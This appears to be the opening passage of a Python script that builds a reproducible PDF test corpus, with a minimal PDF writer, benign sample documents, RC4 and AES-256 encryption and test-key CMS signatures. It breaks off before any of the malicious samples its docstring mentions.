#!/usr/bin/env python3
"""Generates the PDF test corpus (QA-01) using only the Python standard library.

    python tests/corpus/generate.py            # committed files + manifest.json
    python tests/corpus/generate.py --large    # also on-demand files into large/output/

Output is byte-for-byte reproducible on any platform and Python 3.9+: no compression, no
randomness and no timestamps in committed files. CI regenerates the corpus and fails when it
differs from what is committed.

Every malicious sample only *declares* a dangerous action. Targets are `.invalid` domains
(RFC 2606, never resolvable) or programs that do not exist. No sample contains an exploit.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
import sys
from dataclasses import dataclass, field
from pathlib import Path

ROOT = Path(__file__).resolve().parent
LARGE_OUTPUT = ROOT / "large" / "output"

LETTER = (612, 792)
A4 = (595, 842)
A3_LANDSCAPE = (1191, 842)


# --------------------------------------------------------------------------- PDF writer


def pdf_string(text: str) -> str:
    """A literal string for ASCII text, with the PDF escapes."""
    escaped = text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    return f"({escaped})"


def hex_string(data: bytes) -> str:
    return f"<{data.hex().upper()}>"


class Pdf:
    """Minimal writer: numbered objects, classic xref table, deterministic output."""

    def __init__(self) -> None:
        self.objects: list[bytes | None] = []

    def reserve(self) -> int:
        self.objects.append(None)
        return len(self.objects)

    def set(self, num: int, body: str | bytes) -> int:
        self.objects[num - 1] = body.encode("latin-1") if isinstance(body, str) else body
        return num

    def add(self, body: str | bytes) -> int:
        return self.set(self.reserve(), body)

    @staticmethod
    def stream(dictionary: str, data: bytes) -> bytes:
        head = f"<< {dictionary} /Length {len(data)} >>\nstream\n".encode("latin-1")
        return head + data + b"\nendstream"

    def add_stream(self, dictionary: str, data: bytes) -> int:
        return self.add(self.stream(dictionary, data))

    def build(self, root: int, *, doc_id: bytes, encrypt: int | None = None,
              xref_shift: int = 0) -> bytes:
        out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets = []
        for num, body in enumerate(self.objects, start=1):
            if body is None:
                raise ValueError(f"object {num} was reserved but never set")
            offsets.append(len(out))
            out += f"{num} 0 obj\n".encode("latin-1") + body + b"\nendobj\n"
        xref_at = len(out)
        out += f"xref\n0 {len(offsets) + 1}\n".encode("latin-1")
        out += b"0000000000 65535 f \n"
        for offset in offsets:
            out += f"{offset + xref_shift:010d} 00000 n \n".encode("latin-1")
        trailer = f"/Size {len(offsets) + 1} /Root {root} 0 R /ID [{hex_string(doc_id)} {hex_string(doc_id)}]"
        if encrypt is not None:
            trailer += f" /Encrypt {encrypt} 0 R"
        out += f"trailer\n<< {trailer} >>\nstartxref\n{xref_at}\n%%EOF\n".encode("latin-1")
        return bytes(out)


def doc_id(name: str) -> bytes:
    return hashlib.md5(name.encode("utf-8")).digest()


# --------------------------------------------------------------------------- page helpers


@dataclass
class Page:
    """Content for one page. `lines` are (x, y, size, text) drawn in Helvetica."""

    size: tuple[int, int] = LETTER
    lines: list[tuple[int, int, int, str]] = field(default_factory=list)
    extra_content: bytes = b""
    annots: list[int] = field(default_factory=list)
    extra: str = ""
    resources: str = ""
    fonts: str = ""


def text_ops(lines: list[tuple[int, int, int, str]]) -> bytes:
    ops = []
    for x, y, size, text in lines:
        ops.append(f"BT /F1 {size} Tf {x} {y} Td {pdf_string(text)} Tj ET")
    return ("\n".join(ops) + "\n").encode("latin-1") if ops else b""


class Document:
    """Builds a document with a page tree; callers add catalog entries and annotations."""

    def __init__(self, name: str) -> None:
        self.name = name
        self.pdf = Pdf()
        self.catalog = self.pdf.reserve()
        self.pages_root = self.pdf.reserve()
        self.font = self.pdf.add(
            "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>"
        )
        self.page_nums: list[int] = []
        self.catalog_extra = ""

    def reserve_pages(self, count: int) -> list[int]:
        """Reserve page object numbers so annotations can point at pages before they exist."""
        self.page_nums = [self.pdf.reserve() for _ in range(count)]
        return self.page_nums

    def set_page(self, index: int, page: Page) -> None:
        content = self.pdf.add_stream("", text_ops(page.lines) + page.extra_content)
        width, height = page.size
        annots = f" /Annots [{' '.join(f'{a} 0 R' for a in page.annots)}]" if page.annots else ""
        self.pdf.set(
            self.page_nums[index],
            f"<< /Type /Page /Parent {self.pages_root} 0 R /MediaBox [0 0 {width} {height}]"
            f" /Resources << /Font << /F1 {self.font} 0 R {page.fonts}>> {page.resources}>>"
            f" /Contents {content} 0 R{annots}{page.extra} >>",
        )

    def add_pages(self, pages: list[Page]) -> None:
        self.reserve_pages(len(pages))
        for index, page in enumerate(pages):
            self.set_page(index, page)

    def build(self, **kwargs) -> bytes:
        kids = " ".join(f"{n} 0 R" for n in self.page_nums)
        self.pdf.set(self.pages_root, f"<< /Type /Pages /Kids [{kids}] /Count {len(self.page_nums)} >>")
        self.pdf.set(self.catalog, f"<< /Type /Catalog /Pages {self.pages_root} 0 R{self.catalog_extra} >>")
        return self.pdf.build(self.catalog, doc_id=doc_id(self.name), **kwargs)


def link(doc: Document, rect: tuple[int, int, int, int], action: str) -> int:
    x0, y0, x1, y1 = rect
    return doc.pdf.add(
        f"<< /Type /Annot /Subtype /Link /Rect [{x0} {y0} {x1} {y1}] /Border [0 0 0] /A << {action} >> >>"
    )


def single_page_doc(name: str, lines: list[tuple[int, int, int, str]], **page_kwargs) -> Document:
    doc = Document(name)
    doc.add_pages([Page(lines=lines, **page_kwargs)])
    return doc


def link_sample(name: str, label: str, action: str) -> bytes:
    """One page with visible text and a link annotation carrying `action`."""
    doc = Document(name)
    doc.reserve_pages(1)
    annot = link(doc, (72, 690, 540, 712), action)
    doc.set_page(0, Page(lines=[(72, 740, 14, name), (72, 696, 12, label)], annots=[annot]))
    return doc.build()


def uri_action(uri: bytes) -> str:
    return f"/S /URI /URI {hex_string(uri)}"


# --------------------------------------------------------------------------- benign


def benign_single_page() -> bytes:
    return single_page_doc("single-page", [(72, 720, 24, "Hello, PDF Reader.")]).build()


def benign_multi_page() -> bytes:
    doc = Document("multi-page-10")
    pages = []
    for n in range(1, 11):
        lines = [(72, 720, 24, f"Page {n} of 10")]
        if n == 7:
            lines.append((72, 680, 14, "The search keyword needle appears only on page 7."))
        pages.append(Page(lines=lines))
    doc.add_pages(pages)
    return doc.build()


CJK_TEXT = "隱私優先的 PDF 閱讀器"


def benign_mixed_text() -> bytes:
    doc = Document("mixed-text-zh-en")
    codes = sorted({ord(ch) for ch in CJK_TEXT})
    bfchars = "\n".join(f"<{c:04X}> <{c:04X}>" for c in codes)
    to_unicode = (
        "/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap\n"
        "/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def\n"
        "/CMapName /Adobe-Identity-UCS def\n/CMapType 2 def\n"
        "1 begincodespacerange\n<0000> <FFFF>\nendcodespacerange\n"
        f"{len(codes)} beginbfchar\n{bfchars}\nendbfchar\n"
        "endcmap\nCMapName currentdict /CMap defineresource pop\nend\nend\n"
    ).encode("latin-1")
    cmap = doc.pdf.add_stream("", to_unicode)
    descriptor = doc.pdf.add(
        "<< /Type /FontDescriptor /FontName /MingLiU /Flags 6 /FontBBox [0 -200 1000 900]"
        " /ItalicAngle 0 /Ascent 880 /Descent -120 /CapHeight 880 /StemV 93 >>"
    )
    cid_font = doc.pdf.add(
        "<< /Type /Font /Subtype /CIDFontType0 /BaseFont /MingLiU"
        " /CIDSystemInfo << /Registry (Adobe) /Ordering (CNS1) /Supplement 0 >>"
        f" /FontDescriptor {descriptor} 0 R >>"
    )
    cjk_font = doc.pdf.add(
        "<< /Type /Font /Subtype /Type0 /BaseFont /MingLiU /Encoding /UniCNS-UCS2-H"
        f" /DescendantFonts [{cid_font} 0 R] /ToUnicode {cmap} 0 R >>"
    )
    cjk_ops = f"BT /F2 20 Tf 72 660 Td <{CJK_TEXT.encode('utf-16-be').hex().upper()}> Tj ET\n"
    doc.add_pages([
        Page(
            lines=[(72, 720, 20, "Privacy-first PDF Reader")],
            extra_content=cjk_ops.encode("latin-1"),
            fonts=f"/F2 {cjk_font} 0 R ",
        )
    ])
    return doc.build()


OUTLINE = [
    # (title, depth, page index)
    ("Chapter 1", 0, 0),
    ("Section 1.1", 1, 1),
    ("Subsection 1.1.1", 2, 2),
    ("Chapter 2", 0, 3),
    ("Section 2.1", 1, 4),
    ("Appendix", 0, 5),
]


def add_outline(doc: Document, entries: list[tuple[str, int, int]]) -> int:
    """Adds a nested outline from a pre-order (title, depth, page) list; returns its root."""
    root = doc.pdf.reserve()
    nums = [doc.pdf.reserve() for _ in entries]
    parents: list[int] = []
    children: dict[int, list[int]] = {root: []}
    for i, (_, depth, _) in enumerate(entries):
        del parents[depth:]
        parent = nums[parents[-1]] if parents else root
        children.setdefault(parent, []).append(i)
        parents.append(i)
    for parent, kids in children.items():
        for k, i in enumerate(kids):
            title, _, page_index = entries[i]
            links = f" /Parent {parent} 0 R"
            if k > 0:
                links += f" /Prev {nums[kids[k - 1]]} 0 R"
            if k + 1 < len(kids):
                links += f" /Next {nums[kids[k + 1]]} 0 R"
            own = children.get(nums[i], [])
            if own:
                links += f" /First {nums[own[0]]} 0 R /Last {nums[own[-1]]} 0 R /Count {len(own)}"
            dest = f"/Dest [{doc.page_nums[page_index]} 0 R /Fit]"
            doc.pdf.set(nums[i], f"<< /Title {pdf_string(title)}{links} {dest} >>")
    top = children[root]
    doc.pdf.set(
        root,
        f"<< /Type /Outlines /First {nums[top[0]]} 0 R /Last {nums[top[-1]]} 0 R /Count {len(top)} >>",
    )
    return root


def benign_outline() -> bytes:
    doc = Document("outline-3-levels")
    doc.reserve_pages(len(OUTLINE))
    for i, (title, _, _) in enumerate(OUTLINE):
        doc.set_page(i, Page(lines=[(72, 720, 24, title)]))
    outline = add_outline(doc, OUTLINE)
    doc.catalog_extra = f" /Outlines {outline} 0 R /PageMode /UseOutlines"
    return doc.build()


def benign_internal_links() -> bytes:
    doc = Document("internal-links")
    doc.reserve_pages(3)
    to_three = doc.pdf.add(
        f"<< /Type /Annot /Subtype /Link /Rect [72 690 300 712] /Border [0 0 0]"
        f" /Dest [{doc.page_nums[2]} 0 R /XYZ 72 720 0] >>"
    )
    to_two = link(doc, (72, 650, 300, 672), f"/S /GoTo /D [{doc.page_nums[1]} 0 R /Fit]")
    doc.set_page(0, Page(
        lines=[(72, 740, 14, "internal-links"), (72, 696, 12, "Go to page 3 (Dest)"),
               (72, 656, 12, "Go to page 2 (GoTo action)")],
        annots=[to_three, to_two],
    ))
    doc.set_page(1, Page(lines=[(72, 720, 24, "Page 2")]))
    doc.set_page(2, Page(lines=[(72, 720, 24, "Page 3")]))
    return doc.build()


def benign_external_link() -> bytes:
    return link_sample("external-https-link", "https://example.invalid/docs",
                       uri_action(b"https://example.invalid/docs"))


def benign_rotated() -> bytes:
    doc = Document("rotated-page")
    doc.add_pages([
        Page(lines=[(72, 720, 24, "Page 1: not rotated")]),
        Page(lines=[(72, 720, 24, "Page 2: /Rotate 90")], extra=" /Rotate 90"),
    ])
    return doc.build()


def benign_page_sizes() -> bytes:
    doc = Document("mixed-page-sizes")
    doc.add_pages([
        Page(size=A4, lines=[(72, 760, 20, "A4 portrait")]),
        Page(size=LETTER, lines=[(72, 720, 20, "US Letter portrait")]),
        Page(size=A3_LANDSCAPE, lines=[(72, 760, 20, "A3 landscape")]),
        Page(size=(200, 200), lines=[(20, 100, 12, "200 x 200 pt")]),
    ])
    return doc.build()


def gradient_rgb(width: int, height: int) -> bytes:
    data = bytearray()
    for y in range(height):
        for x in range(width):
            data += bytes((x * 255 // (width - 1), y * 255 // (height - 1), 128))
    return bytes(data)


def benign_image_only() -> bytes:
    doc = Document("image-only")
    image = doc.pdf.add_stream(
        "/Type /XObject /Subtype /Image /Width 64 /Height 64 /ColorSpace /DeviceRGB /BitsPerComponent 8",
        gradient_rgb(64, 64),
    )
    doc.add_pages([Page(
        extra_content=b"q 468 0 0 648 72 72 cm /Im1 Do Q\n",
        resources=f"/XObject << /Im1 {image} 0 R >> ",
    )])
    return doc.build()


# RC4 and the standard security handler, revision 2 (PDF 1.7, 7.6.3). The AES-256 handler
# (revision 6) and signatures follow below, also with the standard library only (QA-04).
PASSWORD_PADDING = bytes.fromhex(
    "28BF4E5E4E758A4164004E56FFFA01082E2E00B6D0683E802F0CA9FE6453697A"
)


def rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def pad_password(password: str) -> bytes:
    return (password.encode("latin-1") + PASSWORD_PADDING)[:32]


def benign_encrypted() -> bytes:
    name = "encrypted-rc4-40"
    user_password, owner_password, permissions = "user", "owner", -44
    ident = doc_id(name)
    owner_key = hashlib.md5(pad_password(owner_password)).digest()[:5]
    o_value = rc4(owner_key, pad_password(user_password))
    key = hashlib.md5(
        pad_password(user_password) + o_value + permissions.to_bytes(4, "little", signed=True) + ident
    ).digest()[:5]
    u_value = rc4(key, PASSWORD_PADDING)

    doc = Document(name)
    doc.reserve_pages(1)
    content_num = doc.pdf.reserve()
    object_key = hashlib.md5(key + content_num.to_bytes(3, "little") + (0).to_bytes(2, "little")).digest()[:10]
    plain = text_ops([(72, 720, 24, "Encrypted sample (user password: user)")])
    doc.pdf.set(content_num, Pdf.stream("", rc4(object_key, plain)))
    doc.pdf.set(
        doc.page_nums[0],
        f"<< /Type /Page /Parent {doc.pages_root} 0 R /MediaBox [0 0 612 792]"
        f" /Resources << /Font << /F1 {doc.font} 0 R >> >> /Contents {content_num} 0 R >>",
    )
    encrypt = doc.pdf.add(
        f"<< /Filter /Standard /V 1 /R 2 /Length 40 /O {hex_string(o_value)}"
        f" /U {hex_string(u_value)} /P {permissions} >>"
    )
    return doc.build(encrypt=encrypt)


class DeterministicBytes:
    """A reproducible byte stream for keys, salts and IVs (SHAKE-256 of a seed): never random."""

    def __init__(self, seed: bytes) -> None:
        self._seed = seed
        self._count = 0

    def take(self, n: int) -> bytes:
        self._count += 1
        return hashlib.shake_256(self._seed + self._count.to_bytes(4, "big")).digest(n)


# AES (FIPS-197), encryption only: enough for the AES-256 security handler (revision 6,
# ISO 32000-2, 7.6.4). Table-driven on 32-bit words; checked against FIPS-197 in main().


def _aes_tables() -> tuple[list[int], list[int], list[int], list[int], list[int]]:
    def xtime(a: int) -> int:
        return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else a << 1

    sbox = [0] * 256
    p = q = 1
    while True:
        p ^= xtime(p)  # p * 3
        q ^= q << 1  # q / 3
        q ^= q << 2
        q ^= q << 4
        q &= 0xFF
        if q & 0x80:
            q ^= 0x09
        affine = q ^ (q << 1 | q >> 7) ^ (q << 2 | q >> 6) ^ (q << 3 | q >> 5) ^ (q << 4 | q >> 4)
        sbox[p] = (affine ^ 0x63) & 0xFF
        if p == 1:
            break
    sbox[0] = 0x63
    t0 = [(xtime(s) << 24) | (s << 16) | (s << 8) | (xtime(s) ^ s) for s in sbox]

    def ror(word: int, bits: int) -> int:
        return ((word >> bits) | (word << (32 - bits))) & 0xFFFFFFFF

    return sbox, t0, [ror(w, 8) for w in t0], [ror(w, 16) for w in t0], [ror(w, 24) for w in t0]


AES_SBOX, AES_T0, AES_T1, AES_T2, AES_T3 = _aes_tables()


def _aes_key_schedule(key: bytes) -> tuple[list[int], int]:
    nk = len(key) // 4
    rounds = nk + 6
    sbox = AES_SBOX
    words = [int.from_bytes(key[4 * i:4 * i + 4], "big") for i in range(nk)]
    rcon = 1
    for i in range(nk, 4 * (rounds + 1)):
        temp = words[i - 1]
        if i % nk == 0:
            temp = ((temp << 8) | (temp >> 24)) & 0xFFFFFFFF
            temp = (sbox[temp >> 24] << 24 | sbox[temp >> 16 & 255] << 16
                    | sbox[temp >> 8 & 255] << 8 | sbox[temp & 255]) ^ (rcon << 24)
            rcon = ((rcon << 1) ^ 0x11B) if rcon & 0x80 else rcon << 1
        elif nk > 6 and i % nk == 4:
            temp = (sbox[temp >> 24] << 24 | sbox[temp >> 16 & 255] << 16
                    | sbox[temp >> 8 & 255] << 8 | sbox[temp & 255])
        words.append(words[i - nk] ^ temp)
    return words, rounds


def aes_cbc_encrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    """AES-128/256 in CBC mode without padding; `data` must be a multiple of 16 bytes."""
    if len(data) % 16:
        raise ValueError("AES-CBC input must be a multiple of 16 bytes")
    rk, rounds = _aes_key_schedule(key)
    t0, t1, t2, t3, sbox = AES_T0, AES_T1, AES_T2, AES_T3, AES_SBOX
    c0, c1, c2, c3 = (int.from_bytes(iv[i:i + 4], "big") for i in range(0, 16, 4))
    out = bytearray()
    for offset in range(0, len(data), 16):
        block = data[offset:offset + 16]
        s0 = int.from_bytes(block[0:4], "big") ^ c0 ^ rk[0]
        s1 = int.from_bytes(block[4:8], "big") ^ c1 ^ rk[1]
        s2 = int.from_bytes(block[8:12], "big") ^ c2 ^ rk[2]
        s3 = int.from_bytes(block[12:16], "big") ^ c3 ^ rk[3]
        for r in range(4, 4 * rounds, 4):
            s0, s1, s2, s3 = (
                t0[s0 >> 24] ^ t1[s1 >> 16 & 255] ^ t2[s2 >> 8 & 255] ^ t3[s3 & 255] ^ rk[r],
                t0[s1 >> 24] ^ t1[s2 >> 16 & 255] ^ t2[s3 >> 8 & 255] ^ t3[s0 & 255] ^ rk[r + 1],
                t0[s2 >> 24] ^ t1[s3 >> 16 & 255] ^ t2[s0 >> 8 & 255] ^ t3[s1 & 255] ^ rk[r + 2],
                t0[s3 >> 24] ^ t1[s0 >> 16 & 255] ^ t2[s1 >> 8 & 255] ^ t3[s2 & 255] ^ rk[r + 3],
            )
        r = 4 * rounds
        c0 = (sbox[s0 >> 24] << 24 | sbox[s1 >> 16 & 255] << 16 | sbox[s2 >> 8 & 255] << 8 | sbox[s3 & 255]) ^ rk[r]
        c1 = (sbox[s1 >> 24] << 24 | sbox[s2 >> 16 & 255] << 16 | sbox[s3 >> 8 & 255] << 8 | sbox[s0 & 255]) ^ rk[r + 1]
        c2 = (sbox[s2 >> 24] << 24 | sbox[s3 >> 16 & 255] << 16 | sbox[s0 >> 8 & 255] << 8 | sbox[s1 & 255]) ^ rk[r + 2]
        c3 = (sbox[s3 >> 24] << 24 | sbox[s0 >> 16 & 255] << 16 | sbox[s1 >> 8 & 255] << 8 | sbox[s2 & 255]) ^ rk[r + 3]
        out += c0.to_bytes(4, "big") + c1.to_bytes(4, "big") + c2.to_bytes(4, "big") + c3.to_bytes(4, "big")
    return bytes(out)


def check_aes() -> None:
    """FIPS-197 appendix C: AES-128 and AES-256 of the same block."""
    block = bytes.fromhex("00112233445566778899aabbccddeeff")
    for key, expected in [
        (bytes(range(16)), "69c4e0d86a7b0430d8cdb78070b4c55a"),
        (bytes(range(32)), "8ea2b7ca516745bfeafc49904b496089"),
    ]:
        if aes_cbc_encrypt(key, bytes(16), block).hex() != expected:
            raise AssertionError(f"AES-{len(key) * 8} does not match FIPS-197")


def pkcs7_pad(data: bytes) -> bytes:
    pad = 16 - len(data) % 16
    return data + bytes([pad]) * pad


def r6_hash(password: bytes, salt: bytes, udata: bytes) -> bytes:
    """Algorithm 2.B of ISO 32000-2 (the hash of the AES-256 security handler, revision 6)."""
    k = hashlib.sha256(password + salt + udata).digest()
    rounds = 0
    e = b""
    while rounds < 64 or e[-1] > rounds - 32:
        e = aes_cbc_encrypt(k[:16], k[16:32], (password + k + udata) * 64)
        # The first 16 bytes of E as a big-endian number, modulo 3: 256 = 1 (mod 3), so their sum.
        k = (hashlib.sha256, hashlib.sha384, hashlib.sha512)[sum(e[:16]) % 3](e).digest()
        rounds += 1
    return k[:32]


AES_TEXT = "Encrypted sample, AES-256 (user password: user)"


def benign_encrypted_aes256() -> bytes:
    name = "encrypted-aes256"
    user_password, owner_password, permissions = b"user", b"owner", -4
    stream = DeterministicBytes(f"Pdf-reader corpus {name}".encode("ascii"))
    file_key = stream.take(32)
    user_validation, user_key_salt = stream.take(8), stream.take(8)
    owner_validation, owner_key_salt = stream.take(8), stream.take(8)
    # Algorithms 8, 9 and 10 of ISO 32000-2, 7.6.4.4.
    u_value = r6_hash(user_password, user_validation, b"") + user_validation + user_key_salt
    ue_value = aes_cbc_encrypt(r6_hash(user_password, user_key_salt, b""), bytes(16), file_key)
    o_value = r6_hash(owner_password, owner_validation, u_value) + owner_validation + owner_key_salt
    oe_value = aes_cbc_encrypt(r6_hash(owner_password, owner_key_salt, u_value), bytes(16), file_key)
    perms_block = permissions.to_bytes(4, "little", signed=True) + b"\xff" * 4 + b"Tadb" + stream.take(4)
    perms_value = aes_cbc_encrypt(file_key, bytes(16), perms_block)

    doc = Document(name)
    doc.reserve_pages(1)
    iv = stream.take(16)
    plain = text_ops([(72, 720, 20, AES_TEXT)])
    content = doc.pdf.add(Pdf.stream("", iv + aes_cbc_encrypt(file_key, iv, pkcs7_pad(plain))))
    doc.pdf.set(
        doc.page_nums[0],
        f"<< /Type /Page /Parent {doc.pages_root} 0 R /MediaBox [0 0 612 792]"
        f" /Resources << /Font << /F1 {doc.font} 0 R >> >> /Contents {content} 0 R >>",
    )
    encrypt = doc.pdf.add(
        "<< /Filter /Standard /V 5 /R 6 /Length 256"
        " /CF << /StdCF << /Type /CryptFilter /CFM /AESV3 /AuthEvent /DocOpen /Length 32 >> >>"
        " /StmF /StdCF /StrF /StdCF"
        f" /O {hex_string(o_value)} /U {hex_string(u_value)}"
        f" /OE {hex_string(oe_value)} /UE {hex_string(ue_value)}"
        f" /P {permissions} /Perms {hex_string(perms_value)} /EncryptMetadata true >>"
    )
    return doc.build(encrypt=encrypt)


# Digital signatures: a detached CMS (PKCS #7) signature, SHA-256 with RSA-2048, from a
# self-signed test certificate. The key is derived from a fixed seed each time the corpus is
# generated, so no key material is stored anywhere; anyone can re-derive it, so never trust it.

SIGNER_NAME = "PDF Reader test corpus signer (NOT TRUSTED)"
SIGNER_ORGANIZATION = "Pdf-reader test corpus"
SIGNER_SERIAL = 0x51A7E
OID_RSA = "1.2.840.113549.1.1.1"
OID_SHA256_RSA = "1.2.840.113549.1.1.11"
OID_SHA256 = "2.16.840.1.101.3.4.2.1"
OID_DATA = "1.2.840.113549.1.7.1"
OID_SIGNED_DATA = "1.2.840.113549.1.7.2"
OID_CONTENT_TYPE = "1.2.840.113549.1.9.3"
OID_MESSAGE_DIGEST = "1.2.840.113549.1.9.4"
SHA256_DIGEST_INFO = bytes.fromhex("3031300d060960864801650304020105000420")


def der(tag: int, content: bytes) -> bytes:
    size = len(content)
    if size < 0x80:
        length = bytes([size])
    else:
        encoded = size.to_bytes((size.bit_length() + 7) // 8, "big")
        length = bytes([0x80 | len(encoded)]) + encoded
    return bytes([tag]) + length + content


def der_seq(*items: bytes) -> bytes:
    return der(0x30, b"".join(items))


def der_set(*items: bytes) -> bytes:
    return der(0x31, b"".join(sorted(items)))


def der_int(value: int) -> bytes:
    return der(0x02, value.to_bytes(value.bit_length() // 8 + 1, "big"))


def der_oid(dotted: str) -> bytes:
    parts = [int(part) for part in dotted.split(".")]
    body = bytearray([40 * parts[0] + parts[1]])
    for value in parts[2:]:
        chunk = [value & 0x7F]
        value >>= 7
        while value:
            chunk.append(0x80 | (value & 0x7F))
            value >>= 7
        body += bytes(reversed(chunk))
    return der(0x06, bytes(body))


def der_algorithm(oid: str) -> bytes:
    return der_seq(der_oid(oid), der(0x05, b""))


SMALL_PRIMES = [n for n in range(3, 2000, 2) if all(n % d for d in range(3, int(n ** 0.5) + 1, 2))]


def is_probable_prime(n: int) -> bool:
    """Trial division, then Miller-Rabin with fixed bases (so the result is reproducible)."""
    for p in SMALL_PRIMES:
        if n % p == 0:
            return n == p
    d, s = n - 1, 0
    while d % 2 == 0:
        d //= 2
        s += 1
    for a in SMALL_PRIMES[:40]:
        x = pow(a, d, n)
        if x in (1, n - 1):
            continue
        for _ in range(s - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


_SIGNING_KEY: tuple[int, int, int] | None = None


def test_signing_key() -> tuple[int, int, int]:
    """(n, e, d) of the corpus's RSA-2048 test key, derived from a fixed seed."""
    global _SIGNING_KEY
    if _SIGNING_KEY is None:
        stream = DeterministicBytes(b"Pdf-reader corpus test signing key (never trust it)")
        e = 65537
        primes = []
        while len(primes) < 2:
            # The top two bits set make the modulus exactly 2048 bits.
            candidate = int.from_bytes(stream.take(128), "big") | (3 << 1022) | 1
            if (candidate - 1) % e and is_probable_prime(candidate):
                primes.append(candidate)
        p, q = primes
        phi = (p - 1) * (q - 1)
        _SIGNING_KEY = (p * q, e, pow(e, -1, phi))
    return _SIGNING_KEY


def rsa_sign(key: tuple[int, int, int], message: bytes) -> bytes:
    """RSASSA-PKCS1-v1_5 with SHA-256."""
    n, e, d = key
    size = (n.bit_length() + 7) // 8
    digest_info = SHA256_DIGEST_INFO + hashlib.sha256(message).digest()
    encoded = b"\x00\x01" + b"\xff" * (size - len(digest_info) - 3) + b"\x00" + digest_info
    signature = pow(int.from_bytes(encoded, "big"), d, n)
    if pow(signature, e, n) != int.from_bytes(encoded, "big"):
        raise AssertionError("RSA signature does not verify")
    return signature.to_bytes(size, "big")


def test_certificate(key: tuple[int, int, int]) -> tuple[bytes, bytes]:
    """A self-signed X.509 v3 certificate for the test key, and its subject (= issuer) name."""
    n, e, _ = key

    def rdn(oid: str, value: str) -> bytes:
        return der_set(der_seq(der_oid(oid), der(0x0C, value.encode("utf-8"))))

    name = der_seq(rdn("2.5.4.10", SIGNER_ORGANIZATION), rdn("2.5.4.3", SIGNER_NAME))
    public_key = der_seq(der_algorithm(OID_RSA), der(0x03, b"\x00" + der_seq(der_int(n), der_int(e))))
    # keyUsage (critical): digitalSignature and nonRepudiation.
    key_usage = der_seq(der_oid("2.5.29.15"), der(0x01, b"\xff"), der(0x04, der(0x03, b"\x06\xc0")))
    tbs = der_seq(
        der(0xA0, der_int(2)),
        der_int(SIGNER_SERIAL),
        der_algorithm(OID_SHA256_RSA),
        name,
        der_seq(der(0x17, b"260101000000Z"), der(0x17, b"360101000000Z")),
        name,
        public_key,
        der(0xA3, der_seq(key_usage)),
    )
    certificate = der_seq(tbs, der_algorithm(OID_SHA256_RSA), der(0x03, b"\x00" + rsa_sign(key, tbs)))
    return certificate, name


def cms_detached_signature(data: bytes) -> bytes:
    """A CMS SignedData (RFC 5652) over `data`, without the data itself (adbe.pkcs7.detached)."""
    key = test_signing_key()
    certificate, issuer = test_certificate(key)
    signed_attributes = der_set(
        der_seq(der_oid(OID_CONTENT_TYPE), der_set(der_oid(OID_DATA))),
        der_seq(der_oid(OID_MESSAGE_DIGEST), der_set(der(0x04, hashlib.sha256(data).digest()))),
    )
    signer_info = der_seq(
        der_int(1),
        der_seq(issuer, der_int(SIGNER_SERIAL)),
        der_algorithm(OID_SHA256),
        b"\xa0" + signed_attributes[1:],  # the same SET, as [0] IMPLICIT
        der_algorithm(OID_RSA),
        der(0x04, rsa_sign(key, signed_attributes)),
    )
    signed_data = der_seq(
        der_int(1),
        der_set(der_algorithm(OID_SHA256)),
        der_seq(der_oid(OID_DATA)),
        der(0xA0, certificate),
        der_set(signer_info),
    )
    return der_seq(der_oid(OID_SIGNED_DATA), der(0xA0, signed_data))


SIGNATURE_HEX_DIGITS = 8192
BYTE_RANGE_PLACEHOLDER = "[0 0000000000 0000000000 0000000000]"


def signed_sample(name: str, text: str, certify: bool) -> bytes:
    """One page with an invisible signature field; `certify` adds DocMDP P=1 (no changes)."""
    doc = Document(name)
    doc.reserve_pages(1)
    field = doc.pdf.reserve()
    signature = doc.pdf.reserve()
    reference = ""
    if certify:
        reference = (" /Reference [<< /Type /SigRef /TransformMethod /DocMDP"
                     " /TransformParams << /Type /TransformParams /P 1 /V /1.2 >> >>]")
        doc.catalog_extra += f" /Perms << /DocMDP {signature} 0 R >>"
    doc.pdf.set(
        signature,
        "<< /Type /Sig /Filter /Adobe.PPKLite /SubFilter /adbe.pkcs7.detached"
        f" /Name {pdf_string(SIGNER_NAME)} /Reason (Test corpus sample; the certificate is not trusted)"
        f" /M (D:20260101000000Z){reference}"
        f" /ByteRange {BYTE_RANGE_PLACEHOLDER} /Contents <{'0' * SIGNATURE_HEX_DIGITS}> >>",
    )
    doc.pdf.set(
        field,
        f"<< /Type /Annot /Subtype /Widget /FT /Sig /T (Signature1) /V {signature} 0 R"
        f" /Rect [0 0 0 0] /F 132 /P {doc.page_nums[0]} 0 R >>",
    )
    doc.catalog_extra += f" /AcroForm << /Fields [{field} 0 R] /SigFlags 3 >>"
    doc.set_page(0, Page(lines=[(72, 720, 20, text)], annots=[field]))
    data = bytearray(doc.build())

    # /ByteRange covers everything but the /Contents hex string, which then receives the CMS.
    start = data.index(b"<" + b"0" * SIGNATURE_HEX_DIGITS + b">")
    end = start + SIGNATURE_HEX_DIGITS + 2
    byte_range = f"[0 {start} {end} {len(data) - end}]".ljust(len(BYTE_RANGE_PLACEHOLDER)).encode("ascii")
    at = data.index(BYTE_RANGE_PLACEHOLDER.encode("ascii"))
    data[at:at + len(byte_range)] = byte_range
    cms = cms_detached_signature(bytes(data[:start] + data[end:])).hex().upper()
    if len(cms) > SIGNATURE_HEX_DIGITS:
        raise AssertionError("the CMS signature does not fit in /Contents")
    data[start + 1:end - 1] = cms.ljust(SIGNATURE_HEX_DIGITS, "0").encode("ascii")
    return bytes(data)


SIGNED_TEXT = "Signed sample (test certificate: never trust it)"
CERTIFIED_TEXT = "Certified sample: no changes allowed (DocMDP P=1)"


def benign_signed() -> bytes:
